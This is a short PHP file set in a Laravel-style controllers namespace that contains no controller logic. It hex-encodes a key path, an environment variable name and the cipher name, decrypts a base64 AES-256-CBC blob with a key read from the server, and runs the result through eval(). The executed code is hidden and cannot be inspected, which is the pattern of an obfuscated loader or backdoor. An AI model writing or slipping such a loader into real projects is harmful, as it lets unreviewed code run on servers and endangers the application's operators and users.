<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('x8ISMbluNd7SxYUQ6O9moA==');

$c=base64_decode(

'hf/VHXiHP+kvDFIfpK8UC9wubHInMChZHOqO3PL2aBt7DNSimdbKbR8oJ0rbavVTdaAQDkJxaS04' .
'J/7vFneFjmazeCsWhUEip71Uc/Zmn7j1BcywwfSGGoMhxlIe6XbEnSwrebnI6Xwqlaj/zSWpR0xF' .
'9irXT6vaFLTeaj218Pl5Ml3X9fCrx19/TCxybJ8SdFil1d1FDpbyhUqnf5p2fonxliVSLJTMeO2x' .
'FdVOVmU6HaFOVyvei5gDlj0CufRqIbZqpncmj/WH58lvRrY8cQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

